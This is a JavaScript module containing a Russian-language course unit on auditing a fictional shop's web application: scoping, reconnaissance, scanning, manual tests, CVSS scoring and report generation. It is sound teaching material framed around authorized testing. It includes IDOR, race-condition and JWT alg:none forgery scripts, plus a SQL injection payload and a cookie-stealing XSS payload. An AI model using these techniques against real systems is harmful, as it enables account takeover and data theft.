export default {
  id: 25,
  title: 'Практический проект: Security Audit веб-приложения',
  description: 'Комплексный практический проект: полный аудит безопасности веб-приложения от разведки до финального отчёта с рекомендациями по устранению.',
  lessons: [
    {
      id: 1,
      title: 'Планирование аудита и scope',
      type: 'theory',
      content: [
        { type: 'text', value: 'Security Audit — систематическая проверка безопасности приложения. Проект объединяет знания из всех предыдущих модулей: OWASP Top 10, сетевая безопасность, криптография, аутентификация, API безопасность, инфраструктура и compliance.' },
        { type: 'heading', value: 'Этапы Security Audit' },
        { type: 'list', value: [
          '1. Scope Definition: определение границ аудита (что проверяем, что нет)',
          '2. Information Gathering: сбор информации об архитектуре и стеке',
          '3. Automated Scanning: SAST, DAST, SCA, infrastructure scanning',
          '4. Manual Testing: ручная проверка бизнес-логики и edge cases',
          '5. Vulnerability Analysis: классификация находок по CVSS',
          '6. Report Writing: отчёт с findings, impact, рекомендациями',
          '7. Remediation Support: помощь в устранении уязвимостей',
          '8. Re-testing: проверка что уязвимости устранены'
        ]},
        { type: 'code', language: 'bash', value: '# === Scope Document: шаблон ===\n\n# Проект: Security Audit — Web Application "MyShop"\n# Тип: Grey-box (доступ к документации и тестовым аккаунтам)\n# Период: 2 недели\n\n# В SCOPE:\n# - Web-приложение: https://myshop.example.com\n# - API: https://api.myshop.example.com\n# - Admin panel: https://admin.myshop.example.com\n# - Mobile API endpoints\n# - Базы данных (PostgreSQL, Redis)\n# - Docker/Kubernetes конфигурация\n# - CI/CD pipeline\n# - Cloud инфраструктура (AWS)\n\n# ВНЕ SCOPE:\n# - Физическая безопасность\n# - Социальная инженерия сотрудников\n# - DDoS тестирование\n# - Сторонние сервисы (Stripe, SendGrid)\n\n# Тестовые аккаунты:\n# - Regular user: user@test.com / TestUser123!\n# - Admin: admin@test.com / TestAdmin123!\n# - API key: test_api_key_xxxxx\n\n# Rules of Engagement:\n# - Тестирование только на staging окружении\n# - Не удалять и не модифицировать production данные\n# - При обнаружении критической уязвимости — немедленное уведомление\n# - Все действия логируются' },
        { type: 'warning', value: 'ОБЯЗАТЕЛЬНО получите письменное разрешение (Authorization Letter) перед началом аудита. Даже для внутреннего аудита — документируйте scope, контакты, экстренные процедуры. Несанкционированное тестирование — уголовное преступление.' }
      ]
    },
    {
      id: 2,
      title: 'Разведка и сбор информации',
      type: 'theory',
      content: [
        { type: 'text', value: 'Information Gathering — первый активный этап аудита. Цель: понять архитектуру, технологический стек, точки входа и поверхность атаки. Используются как пассивные (OSINT), так и активные методы (сканирование).' },
        { type: 'code', language: 'bash', value: '# === Пассивная разведка (OSINT) ===\n\n# 1. DNS разведка\n# Найти поддомены\ndig +short myshop.example.com\ndig +short ANY myshop.example.com\n\n# Subfinder — поиск поддоменов\nsubfinder -d example.com -o subdomains.txt\n# api.example.com\n# admin.example.com\n# staging.example.com  # Staging — часто менее защищён!\n# old.example.com       # Старая версия — уязвимости!\n\n# 2. Технологический стек\n# HTTP заголовки\ncurl -sI https://myshop.example.com | grep -iE "server|x-powered|x-frame|x-xss"\n# Server: nginx/1.24.0\n# X-Powered-By: Express  # Раскрытие стека!\n\n# 3. robots.txt и sitemap.xml\ncurl -s https://myshop.example.com/robots.txt\n# Disallow: /admin/\n# Disallow: /api/internal/  # Интересные пути!\n\ncurl -s https://myshop.example.com/sitemap.xml\n\n# 4. JavaScript файлы — часто содержат API endpoints\ncurl -s https://myshop.example.com | grep -oP \'src=\"[^\"]+\\.js\"\'\n# Скачать и искать endpoints:\ncurl -s https://myshop.example.com/static/app.js | \\\n  grep -oP \'(/api/[a-zA-Z0-9/_-]+)\'\n# /api/users\n# /api/orders\n# /api/admin/users    # Админский endpoint!\n# /api/internal/debug # Debug endpoint в production!\n\n# 5. Git exposure\ncurl -s https://myshop.example.com/.git/HEAD\n# Если ответ 200 — утечка исходного кода!\n\n# 6. Общедоступная информация\n# - GitHub organization: исходный код, issues, commits\n# - LinkedIn: технологии, вакансии (подсказка о стеке)\n# - Shodan/Censys: открытые порты, сервисы' },
        { type: 'code', language: 'bash', value: '# === Активное сканирование ===\n# ТОЛЬКО с разрешением! На staging/test окружении!\n\n# 1. Сканирование портов (nmap)\nnmap -sV -sC -p- -oN nmap_full.txt staging.example.com\n# -sV: определение версий сервисов\n# -sC: стандартные скрипты обнаружения\n# -p-: все 65535 портов\n# Результат:\n# PORT     STATE SERVICE  VERSION\n# 22/tcp   open  ssh      OpenSSH 8.9p1\n# 80/tcp   open  http     nginx 1.24.0\n# 443/tcp  open  https    nginx 1.24.0\n# 5432/tcp open  postgres PostgreSQL 15.4  # БД открыта наружу!\n# 6379/tcp open  redis    Redis 7.2.0      # Redis без пароля!\n# 9200/tcp open  http     Elasticsearch    # ES открыт!\n\n# 2. Сканирование веб-уязвимостей (Nikto)\nnikto -h https://staging.example.com -o nikto_report.html\n\n# 3. Перечисление директорий (gobuster)\ngobuster dir -u https://staging.example.com \\\n  -w /usr/share/wordlists/dirb/common.txt \\\n  -o gobuster_results.txt\n# /admin/          (Status: 302) -> redirect to login\n# /api/            (Status: 200)\n# /api/docs        (Status: 200)  # Swagger UI в production!\n# /debug/          (Status: 200)  # Debug endpoint!\n# /phpmyadmin/     (Status: 200)  # phpMyAdmin!\n\n# 4. SSL/TLS проверка\nnmap --script ssl-enum-ciphers -p 443 staging.example.com\n# Или используйте testssl.sh:\n./testssl.sh https://staging.example.com' },
        { type: 'tip', value: 'Разведка — самый важный этап. Чем больше информации вы соберёте, тем эффективнее будет тестирование. Записывайте ВСЁ: каждый endpoint, заголовок, cookie, параметр. Используйте Burp Suite для автоматического маппинга приложения.' }
      ]
    },
    {
      id: 3,
      title: 'Автоматическое сканирование уязвимостей',
      type: 'theory',
      content: [
        { type: 'text', value: 'Автоматическое сканирование находит типовые уязвимости быстро: SAST анализирует исходный код, DAST тестирует работающее приложение, SCA проверяет зависимости. Автоматика находит ~60% уязвимостей, остальные требуют ручного тестирования.' },
        { type: 'code', language: 'bash', value: '# === SAST: Статический анализ кода ===\n\n# Semgrep — мощный open-source SAST\npip install semgrep\n\n# Проверка по OWASP Top 10\nsemgrep scan --config p/owasp-top-ten ./src/\n# Результат:\n# src/api/search.py:42 — SQL Injection\n#   query = f"SELECT * FROM products WHERE name LIKE \'%{search}%\'"\n# \n# src/api/users.py:78 — Hardcoded Secret\n#   JWT_SECRET = "super-secret-key-123"\n#\n# src/templates/profile.html:15 — XSS\n#   <div>{{ user.bio | safe }}</div>\n\n# Semgrep для JavaScript\nsemgrep scan --config p/javascript ./src/\n\n# Semgrep для Python\nsemgrep scan --config p/python ./src/\n\n# Bandit — SAST для Python\npip install bandit\nbandit -r ./src/ -f json -o bandit_report.json\n\n# ESLint Security Plugin — для JavaScript\nnpm install eslint-plugin-security\n# .eslintrc:\n# { "plugins": ["security"], "extends": ["plugin:security/recommended"] }\n\n# === SCA: Проверка зависимостей ===\n\n# npm audit\nnpm audit --json > npm_audit.json\n\n# pip-audit для Python\npip install pip-audit\npip-audit -r requirements.txt -f json -o pip_audit.json\n\n# Trivy — универсальный сканер\ntrivy fs --scanners vuln,secret,misconfig ./\n# Находит: уязвимые зависимости, секреты в коде, misconfigurations' },
        { type: 'code', language: 'bash', value: '# === DAST: Динамический анализ ===\n\n# OWASP ZAP — бесплатный DAST сканер\n# Запуск в Docker\ndocker run -t zaproxy/zap-stable zap-baseline.py \\\n  -t https://staging.example.com \\\n  -r zap_report.html\n\n# ZAP Full Scan (более глубокий)\ndocker run -t zaproxy/zap-stable zap-full-scan.py \\\n  -t https://staging.example.com \\\n  -r zap_full_report.html\n\n# ZAP API Scan (для REST API)\ndocker run -t zaproxy/zap-stable zap-api-scan.py \\\n  -t https://staging.example.com/api/openapi.json \\\n  -f openapi \\\n  -r zap_api_report.html\n\n# Nuclei — сканер на шаблонах\nnuclei -u https://staging.example.com \\\n  -t cves/ -t vulnerabilities/ -t misconfiguration/ \\\n  -o nuclei_results.txt\n\n# === Infrastructure Scanning ===\n\n# Trivy для Docker образов\ntrivy image myshop:latest\n# CRITICAL: CVE-2024-xxxx in openssl 3.0.2 (fixed in 3.0.14)\n# HIGH: CVE-2024-yyyy in node 18.17 (fixed in 18.19)\n\n# Trivy для Kubernetes\ntrivy k8s --report summary cluster\n\n# Checkov — IaC scanner (Terraform, K8s, Docker)\npip install checkov\ncheckov -d ./terraform/ --framework terraform\ncheckov -f Dockerfile\ncheckov -f k8s-deployment.yaml' },
        { type: 'tip', value: 'Автоматические сканеры генерируют false positives. Каждую находку нужно верифицировать вручную. Приоритезируйте: Critical/High → верифицировать сразу, Medium → верифицировать в процессе, Low/Info → проверить в конце. Не включайте неверифицированные находки в отчёт.' }
      ]
    },
    {
      id: 4,
      title: 'Ручное тестирование и OWASP проверки',
      type: 'theory',
      content: [
        { type: 'text', value: 'Ручное тестирование находит уязвимости бизнес-логики, которые невозможно обнаружить автоматически: IDOR, race conditions, privilege escalation через бизнес-процессы, обход платёжной логики.' },
        { type: 'heading', value: 'Чеклист ручного тестирования' },
        { type: 'list', value: [
          'Authentication: brute force, weak passwords, session fixation, JWT attacks',
          'Authorization: IDOR, horizontal/vertical privilege escalation, forced browsing',
          'Input Validation: SQLi, XSS, command injection, path traversal',
          'Business Logic: price manipulation, race conditions, coupon abuse',
          'API: mass assignment, rate limiting bypass, GraphQL introspection',
          'File Upload: unrestricted types, path traversal, XXE via SVG',
          'Error Handling: stack traces, debug info, verbose errors'
        ]},
        { type: 'code', language: 'python', value: '# === Ручные проверки с Python ===\nimport requests\n\nBASE = "https://staging.example.com/api"\nSESSION = requests.Session()\n\n# Аутентификация\ndef login(email, password):\n    r = SESSION.post(f"{BASE}/auth/login",\n                     json={"email": email, "password": password})\n    if r.status_code == 200:\n        token = r.json()["token"]\n        SESSION.headers["Authorization"] = f"Bearer {token}"\n    return r\n\n# === IDOR: Insecure Direct Object Reference ===\ndef test_idor():\n    """Проверка: может ли user1 видеть данные user2?"""\n    login("user1@test.com", "TestUser1!")\n    \n    # Мой профиль (ID: 1)\n    my_profile = SESSION.get(f"{BASE}/users/1").json()\n    print(f"My profile: {my_profile[\'email\']}")  # OK\n    \n    # Чужой профиль (ID: 2) — должен быть 403!\n    other = SESSION.get(f"{BASE}/users/2")\n    if other.status_code == 200:\n        print(f"IDOR FOUND! Can access user 2: {other.json()[\'email\']}")\n    else:\n        print(f"IDOR protected: {other.status_code}")\n    \n    # Перебор ID\n    for uid in range(1, 20):\n        r = SESSION.get(f"{BASE}/users/{uid}")\n        if r.status_code == 200:\n            print(f"  Accessible: /users/{uid} -> {r.json().get(\'email\', \'?\')}") \n\n# === Price Manipulation ===\ndef test_price_manipulation():\n    """Проверка: можно ли изменить цену на клиенте?"""\n    login("user1@test.com", "TestUser1!")\n    \n    # Нормальный заказ\n    order = {\n        "product_id": 1,\n        "quantity": 1,\n        "price": 99.99  # Цена из каталога\n    }\n    \n    # Атака: изменить цену\n    order["price"] = 0.01\n    r = SESSION.post(f"{BASE}/orders", json=order)\n    if r.status_code == 200 and r.json().get("total") == 0.01:\n        print("PRICE MANIPULATION! Server accepted client-side price")\n    else:\n        print(f"Protected: server-side pricing ({r.status_code})")\n\n# === Race Condition (промокод) ===\nimport threading\n\ndef test_race_condition():\n    """Проверка: можно ли использовать промокод дважды?"""\n    login("user1@test.com", "TestUser1!")\n    results = []\n    \n    def apply_coupon():\n        r = SESSION.post(f"{BASE}/coupons/apply",\n                        json={"code": "DISCOUNT50"})\n        results.append(r.status_code)\n    \n    # 10 параллельных запросов\n    threads = [threading.Thread(target=apply_coupon) for _ in range(10)]\n    for t in threads:\n        t.start()\n    for t in threads:\n        t.join()\n    \n    successes = results.count(200)\n    if successes > 1:\n        print(f"RACE CONDITION! Coupon applied {successes} times")\n    else:\n        print("Protected: coupon applied only once")\n\ntest_idor()\ntest_price_manipulation()\ntest_race_condition()' },
        { type: 'code', language: 'python', value: '# === JWT Attacks ===\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef decode_jwt(token):\n    """Декодировать JWT без проверки подписи"""\n    parts = token.split(".")\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))\n    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))\n    return header, payload\n\ndef test_jwt_none_attack(token):\n    """Атака alg:none — подделка JWT без подписи"""\n    header, payload = decode_jwt(token)\n    \n    # Попытка 1: alg: none\n    header["alg"] = "none"\n    payload["role"] = "admin"  # Повышение привилегий\n    \n    fake_header = base64.urlsafe_b64encode(\n        json.dumps(header).encode()).decode().rstrip("=")\n    fake_payload = base64.urlsafe_b64encode(\n        json.dumps(payload).encode()).decode().rstrip("=")\n    \n    fake_token = f"{fake_header}.{fake_payload}."\n    \n    r = requests.get(f"{BASE}/admin/users",\n                    headers={"Authorization": f"Bearer {fake_token}"})\n    if r.status_code == 200:\n        print("JWT NONE ATTACK works! Server accepts alg:none")\n    else:\n        print(f"Protected against alg:none ({r.status_code})")\n\ndef test_jwt_weak_secret(token):\n    """Brute force JWT secret (только для тестирования!)"""\n    _, payload = decode_jwt(token)\n    header_b64, payload_b64, signature = token.split(".")\n    data = f"{header_b64}.{payload_b64}"\n    \n    # Словарь частых слабых секретов\n    weak_secrets = [\n        "secret", "password", "123456", "jwt_secret",\n        "super-secret", "mysecretkey", "changeme",\n        "your-256-bit-secret"\n    ]\n    \n    for secret in weak_secrets:\n        expected = base64.urlsafe_b64encode(\n            hmac.new(secret.encode(), data.encode(),\n                    hashlib.sha256).digest()\n        ).decode().rstrip("=")\n        if expected == signature:\n            print(f"WEAK JWT SECRET FOUND: \\\"{secret}\\\"")\n            return secret\n    \n    print("JWT secret not in weak list (good)")' },
        { type: 'warning', value: 'Все ручные тесты выполняются ТОЛЬКО на staging/test окружении с разрешения. Race condition тесты могут нагрузить сервер. IDOR тесты используют только тестовые аккаунты. Документируйте каждый тест: что проверяли, результат, evidence.' }
      ]
    },
    {
      id: 5,
      title: 'Классификация уязвимостей и CVSS',
      type: 'theory',
      content: [
        { type: 'text', value: 'После обнаружения уязвимостей необходимо классифицировать их по severity. CVSS (Common Vulnerability Scoring System) — стандартная шкала оценки серьёзности. Каждая находка получает оценку от 0 до 10, определяющую приоритет исправления.' },
        { type: 'heading', value: 'CVSS v3.1 шкала' },
        { type: 'list', value: [
          'Critical (9.0-10.0): немедленное исправление, блокирует релиз',
          'High (7.0-8.9): исправление в ближайшем спринте, высокий приоритет',
          'Medium (4.0-6.9): планирование исправления, средний приоритет',
          'Low (0.1-3.9): исправление при возможности, низкий приоритет',
          'Informational (0.0): рекомендация, не уязвимость'
        ]},
        { type: 'code', language: 'python', value: '# === Классификация находок Security Audit ===\n\nfindings = [\n    {\n        "id": "VULN-001",\n        "title": "SQL Injection в /api/search",\n        "severity": "Critical",\n        "cvss": 9.8,\n        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",\n        "description": "Параметр q уязвим к SQL injection.",\n        "evidence": "GET /api/search?q=test UNION SELECT username FROM users--",\n        "impact": "Полный доступ к БД: утечка PII 50K пользователей.",\n        "remediation": "Использовать prepared statements.",\n        "references": ["CWE-89", "OWASP A03:2021"]\n    },\n    {\n        "id": "VULN-002",\n        "title": "IDOR: доступ к чужим заказам",\n        "severity": "High",\n        "cvss": 7.5,\n        "description": "Endpoint /api/orders/{id} не проверяет принадлежность.",\n        "evidence": "GET /api/orders/1..1000 -- все доступны",\n        "impact": "Утечка адресов, сумм заказов.",\n        "remediation": "Проверка order.user_id == current_user.id.",\n        "references": ["CWE-639", "OWASP A01:2021"]\n    },\n    {\n        "id": "VULN-003",\n        "title": "Stored XSS в профиле",\n        "severity": "High",\n        "cvss": 7.1,\n        "description": "Поле bio не sanitize-ится.",\n        "evidence": "bio: <script>fetch(url+document.cookie)</script>",\n        "impact": "Кража cookies, keylogging.",\n        "remediation": "HTML encode + CSP + DOMPurify.",\n        "references": ["CWE-79", "OWASP A03:2021"]\n    },\n    {\n        "id": "VULN-004",\n        "title": "PostgreSQL доступен извне",\n        "severity": "Critical",\n        "cvss": 9.1,\n        "description": "PostgreSQL слушает на 0.0.0.0:5432.",\n        "evidence": "nmap: 5432/tcp open postgresql",\n        "impact": "Brute force БД, RCE.",\n        "remediation": "listen_addresses=127.0.0.1, firewall.",\n        "references": ["CWE-200"]\n    },\n    {\n        "id": "VULN-005",\n        "title": "JWT слабый секрет",\n        "severity": "High",\n        "cvss": 8.2,\n        "description": "JWT secret подбирается за секунды.",\n        "evidence": "hashcat: secret найден за 2 сек",\n        "impact": "Подделка JWT с ролью admin.",\n        "remediation": "256-bit secret или RS256.",\n        "references": ["CWE-347", "OWASP A02:2021"]\n    },\n    {\n        "id": "VULN-006",\n        "title": "Нет Rate Limiting на login",\n        "severity": "Medium",\n        "cvss": 5.3,\n        "description": "Login endpoint без лимита попыток.",\n        "evidence": "1000 запросов за 10 сек обработаны",\n        "impact": "Brute force, credential stuffing.",\n        "remediation": "Rate limiting: 5 попыток за 15 мин.",\n        "references": ["CWE-307"]\n    },\n    {\n        "id": "VULN-007",\n        "title": "Server header leak",\n        "severity": "Low",\n        "cvss": 2.3,\n        "description": "Server: nginx/1.24.0, X-Powered-By: Express.",\n        "evidence": "curl -sI https://myshop.example.com",\n        "impact": "Разведка для поиска CVE.",\n        "remediation": "server_tokens off, disable x-powered-by.",\n        "references": ["CWE-200"]\n    }\n]\n\n# Сводка\nseverity_count = {}\nfor f in findings:\n    s = f["severity"]\n    severity_count[s] = severity_count.get(s, 0) + 1\n\nprint("=== Security Audit Summary ===")\nprint(f"Total findings: {len(findings)}")\nfor sev in ["Critical", "High", "Medium", "Low"]:\n    print(f"  {sev}: {severity_count.get(sev, 0)}")' },
        { type: 'tip', value: 'CVSS калькулятор: https://www.first.org/cvss/calculator/3.1. Используйте его для точной оценки. Кроме CVSS учитывайте бизнес-контекст: SQL injection на странице "О нас" менее критичен, чем на странице оплаты, даже если CVSS одинаковый.' }
      ]
    },
    {
      id: 6,
      title: 'Написание отчёта Security Audit',
      type: 'theory',
      content: [
        { type: 'text', value: 'Отчёт — главный deliverable аудита. Он должен быть понятен как техническим специалистам, так и руководству. Структура: Executive Summary (для руководства), Methodology, Findings (детали для разработчиков), Recommendations.' },
        { type: 'heading', value: 'Структура отчёта' },
        { type: 'list', value: [
          'Title Page: название проекта, даты, конфиденциальность',
          'Executive Summary: 1 страница для руководства (3-5 предложений, ключевые риски)',
          'Scope & Methodology: что проверяли, какими инструментами, ограничения',
          'Summary of Findings: таблица всех находок с severity',
          'Detailed Findings: для каждой уязвимости: описание, evidence, impact, remediation',
          'Recommendations: приоритизированный план исправлений',
          'Appendices: детальные скриншоты, логи, конфигурации'
        ]},
        { type: 'code', language: 'python', value: '# === Генератор отчёта Security Audit ===\nfrom datetime import datetime, timezone\n\nclass AuditReport:\n    def __init__(self, project, auditor, scope):\n        self.project = project\n        self.auditor = auditor\n        self.scope = scope\n        self.findings = []\n        self.start_date = None\n        self.end_date = None\n    \n    def add_finding(self, finding):\n        self.findings.append(finding)\n    \n    def generate(self):\n        severity_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}\n        sorted_findings = sorted(\n            self.findings,\n            key=lambda f: severity_order.get(f["severity"], 5)\n        )\n        \n        report = []\n        report.append("=" * 60)\n        report.append(f"SECURITY AUDIT REPORT")\n        report.append(f"Project: {self.project}")\n        report.append(f"Auditor: {self.auditor}")\n        report.append(f"Date: {datetime.now(timezone.utc).strftime(\'%Y-%m-%d\')}")\n        report.append(f"Classification: CONFIDENTIAL")\n        report.append("=" * 60)\n        \n        # Executive Summary\n        critical = sum(1 for f in self.findings if f["severity"] == "Critical")\n        high = sum(1 for f in self.findings if f["severity"] == "High")\n        medium = sum(1 for f in self.findings if f["severity"] == "Medium")\n        low = sum(1 for f in self.findings if f["severity"] == "Low")\n        \n        report.append("\\n## EXECUTIVE SUMMARY")\n        report.append(f"Обнаружено {len(self.findings)} уязвимостей: "\n                      f"{critical} Critical, {high} High, {medium} Medium, {low} Low.")\n        \n        if critical > 0:\n            report.append("РЕКОМЕНДАЦИЯ: НЕМЕДЛЕННО устранить Critical уязвимости. "\n                         "Они позволяют полную компрометацию системы.")\n        \n        # Overall Risk\n        if critical > 0:\n            risk = "CRITICAL"\n        elif high > 0:\n            risk = "HIGH"\n        elif medium > 0:\n            risk = "MEDIUM"\n        else:\n            risk = "LOW"\n        report.append(f"Общий уровень риска: {risk}")\n        \n        # Findings Summary Table\n        report.append("\\n## SUMMARY OF FINDINGS")\n        report.append(f"{\'ID\':<10} {\'Severity\':<10} {\'CVSS\':<6} {\'Title\'}")\n        report.append("-" * 60)\n        for f in sorted_findings:\n            report.append(\n                f"{f[\'id\']:<10} {f[\'severity\']:<10} {f[\'cvss\']:<6.1f} {f[\'title\']}"\n            )\n        \n        # Detailed Findings\n        report.append("\\n## DETAILED FINDINGS")\n        for f in sorted_findings:\n            report.append(f"\\n### {f[\'id\']}: {f[\'title\']}")\n            report.append(f"Severity: {f[\'severity\']} | CVSS: {f[\'cvss\']}")\n            report.append(f"\\nDescription: {f[\'description\']}")\n            report.append(f"Evidence: {f[\'evidence\']}")\n            report.append(f"Impact: {f[\'impact\']}")\n            report.append(f"Remediation: {f[\'remediation\']}")\n        \n        # Recommendations\n        report.append("\\n## RECOMMENDATIONS (по приоритету)")\n        report.append("Неделя 1: Исправить все Critical уязвимости")\n        report.append("Неделя 2-3: Исправить все High уязвимости")\n        report.append("Месяц 1: Исправить Medium уязвимости")\n        report.append("Квартал: Исправить Low и внедрить рекомендации")\n        report.append("Continuous: SAST/DAST в CI/CD, security training")\n        \n        return "\\n".join(report)\n\n# Использование\nreport = AuditReport(\n    project="MyShop Web Application",\n    auditor="Security Team",\n    scope="Web app, API, infrastructure"\n)\n# Добавить findings из предыдущего шага\n# report.add_finding(finding)\n# print(report.generate())' },
        { type: 'warning', value: 'Отчёт Security Audit — конфиденциальный документ. Он содержит информацию об уязвимостях, которая может быть использована для атаки. Ограничьте доступ: only need-to-know. Передавайте через защищённые каналы (зашифрованный email, secure file sharing).' }
      ]
    },
    {
      id: 7,
      title: 'Практика: Полный Security Audit',
      type: 'practice',
      difficulty: 'hard',
      description: 'Проведите полный security audit веб-приложения: от разведки до финального отчёта. Объедините все знания курса в комплексный проект.',
      requirements: [
        'Составьте scope document с описанием целей, границ и rules of engagement',
        'Проведите разведку: обнаружьте endpoints, технологии, конфигурации',
        'Выполните автоматическое сканирование (SAST, DAST, SCA) и верифицируйте находки',
        'Проведите ручное тестирование: IDOR, business logic, JWT attacks, race conditions',
        'Классифицируйте находки по CVSS и создайте приоритизированный план исправлений',
        'Сгенерируйте полный отчёт: Executive Summary, Findings, Recommendations',
        'Подготовьте remediation checklist и план re-testing'
      ],
      hint: 'Используйте структуру: 1) Scope -> 2) Recon (nmap, gobuster, curl) -> 3) Auto scan (semgrep, zap, trivy) -> 4) Manual test (IDOR, JWT, race condition) -> 5) Classify (CVSS) -> 6) Report. Каждую находку документируйте с evidence.',
      expectedOutput: 'SCOPE: Web app + API + Infrastructure, grey-box\nRECON: 5 subdomains, 8 open ports, tech stack identified\nAUTO SCAN: semgrep (3 findings), ZAP (5 findings), trivy (2 CVEs)\nMANUAL TEST: IDOR confirmed, JWT weak secret, price manipulation\n\nFINDINGS SUMMARY:\n  Critical: 2 (SQLi, DB exposed)\n  High: 3 (IDOR, XSS, JWT)\n  Medium: 1 (no rate limiting)\n  Low: 1 (server header)\n\nRISK LEVEL: CRITICAL\nREMEDIATION PLAN: Week 1 (Critical) -> Week 2-3 (High) -> Month 1 (Medium)\n\nREPORT: 7 findings documented with evidence, CVSS, remediation\nRE-TEST PLAN: scheduled for 2 weeks after remediation',
      solution: '#!/usr/bin/env python3\n"""Complete Security Audit — Final Project"""\nfrom datetime import datetime, timezone\nimport json\n\nclass SecurityAudit:\n    def __init__(self, project_name):\n        self.project = project_name\n        self.scope = {}\n        self.recon = {}\n        self.findings = []\n        self.start = datetime.now(timezone.utc)\n    \n    def define_scope(self):\n        self.scope = {\n            "target": "MyShop Web Application",\n            "type": "Grey-box",\n            "in_scope": [\n                "https://staging.myshop.example.com",\n                "https://api.staging.myshop.example.com",\n                "Infrastructure (AWS)",\n                "Docker containers",\n            ],\n            "out_of_scope": [\n                "Physical security", "Social engineering",\n                "DDoS testing", "Third-party services"\n            ],\n            "rules": [\n                "Staging environment only",\n                "No data modification in production",\n                "Critical findings reported immediately"\n            ]\n        }\n        print(f"[+] Scope defined: {len(self.scope[\'in_scope\'])} targets")\n    \n    def reconnaissance(self):\n        self.recon = {\n            "subdomains": ["www", "api", "admin", "staging", "old"],\n            "open_ports": {\n                22: "SSH (OpenSSH 8.9)",\n                80: "HTTP (nginx 1.24)",\n                443: "HTTPS (nginx 1.24)",\n                5432: "PostgreSQL 15.4 (EXPOSED!)",\n                6379: "Redis 7.2 (NO AUTH!)",\n            },\n            "tech_stack": ["Node.js", "Express", "PostgreSQL", "Redis", "nginx"],\n            "interesting_paths": [\n                "/api/docs (Swagger UI)",\n                "/api/internal/debug",\n                "/.git/HEAD (404 - safe)",\n            ]\n        }\n        exposed = [p for p, s in self.recon["open_ports"].items() if "EXPOSED" in s or "NO AUTH" in s]\n        print(f"[+] Recon: {len(self.recon[\'subdomains\'])} subdomains, "\n              f"{len(self.recon[\'open_ports\'])} ports, {len(exposed)} critical exposures")\n    \n    def automated_scan(self):\n        auto_findings = [\n            ("SAST", "SQL Injection in /api/search", "Critical", 9.8),\n            ("SAST", "Hardcoded JWT secret", "High", 8.2),\n            ("DAST", "Stored XSS in user bio", "High", 7.1),\n            ("DAST", "Missing security headers", "Medium", 4.3),\n            ("SCA", "CVE in express 4.17.1", "Medium", 5.3),\n            ("Infra", "PostgreSQL exposed to internet", "Critical", 9.1),\n        ]\n        for source, title, severity, cvss in auto_findings:\n            self.findings.append({\n                "id": f"VULN-{len(self.findings)+1:03d}",\n                "source": source, "title": title,\n                "severity": severity, "cvss": cvss,\n                "verified": False\n            })\n        print(f"[+] Auto scan: {len(auto_findings)} findings")\n    \n    def manual_testing(self):\n        manual_findings = [\n            ("Manual", "IDOR in /api/orders/{id}", "High", 7.5),\n            ("Manual", "No rate limiting on login", "Medium", 5.3),\n            ("Manual", "Server header information leak", "Low", 2.3),\n        ]\n        for source, title, severity, cvss in manual_findings:\n            self.findings.append({\n                "id": f"VULN-{len(self.findings)+1:03d}",\n                "source": source, "title": title,\n                "severity": severity, "cvss": cvss,\n                "verified": True\n            })\n        # Verify auto findings\n        for f in self.findings:\n            f["verified"] = True\n        print(f"[+] Manual test: {len(manual_findings)} additional findings")\n        print(f"[+] All {len(self.findings)} findings verified")\n    \n    def generate_report(self):\n        severity_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}\n        sorted_f = sorted(self.findings, key=lambda f: severity_order.get(f["severity"], 9))\n        \n        counts = {}\n        for f in self.findings:\n            counts[f["severity"]] = counts.get(f["severity"], 0) + 1\n        \n        print("\\n" + "=" * 60)\n        print("SECURITY AUDIT REPORT")\n        print(f"Project: {self.project}")\n        print(f"Date: {datetime.now(timezone.utc).strftime(\'%Y-%m-%d\')}")\n        print("=" * 60)\n        \n        print("\\n--- EXECUTIVE SUMMARY ---")\n        print(f"Обнаружено {len(self.findings)} уязвимостей:")\n        for sev in ["Critical", "High", "Medium", "Low"]:\n            if sev in counts:\n                print(f"  {sev}: {counts[sev]}")\n        \n        risk = "CRITICAL" if counts.get("Critical", 0) > 0 else "HIGH"\n        print(f"\\nОбщий уровень риска: {risk}")\n        print("РЕКОМЕНДАЦИЯ: немедленно устранить Critical уязвимости.")\n        \n        print("\\n--- FINDINGS ---")\n        print(f"{\'ID\':<10} {\'Sev\':<10} {\'CVSS\':<6} {\'Title\'}")\n        print("-" * 60)\n        for f in sorted_f:\n            print(f"{f[\'id\']:<10} {f[\'severity\']:<10} {f[\'cvss\']:<6.1f} {f[\'title\']}")\n        \n        print("\\n--- REMEDIATION PLAN ---")\n        print("Week 1:  Fix Critical (SQLi, DB exposure)")\n        print("Week 2-3: Fix High (IDOR, XSS, JWT)")\n        print("Month 1: Fix Medium (rate limiting, CVE)")\n        print("Quarter: Fix Low, implement SAST/DAST in CI/CD")\n        \n        print("\\n--- RE-TEST ---")\n        print("Scheduled: 2 weeks after remediation completion")\n        print("Focus: verify all Critical and High fixes")\n        \n        return True\n\n# === Run Full Audit ===\naudit = SecurityAudit("MyShop Web Application")\naudit.define_scope()\naudit.reconnaissance()\naudit.automated_scan()\naudit.manual_testing()\naudit.generate_report()',
      explanation: 'Security Audit — это комплексный процесс, объединяющий все знания курса. Порядок: scope definition (границы), разведка (поверхность атаки), автоматическое сканирование (типовые уязвимости), ручное тестирование (бизнес-логика), классификация по CVSS, отчёт с приоритизированными рекомендациями, и re-testing после устранения. Ключевые навыки: системный подход, документирование, коммуникация результатов.'
    }
  ]
}
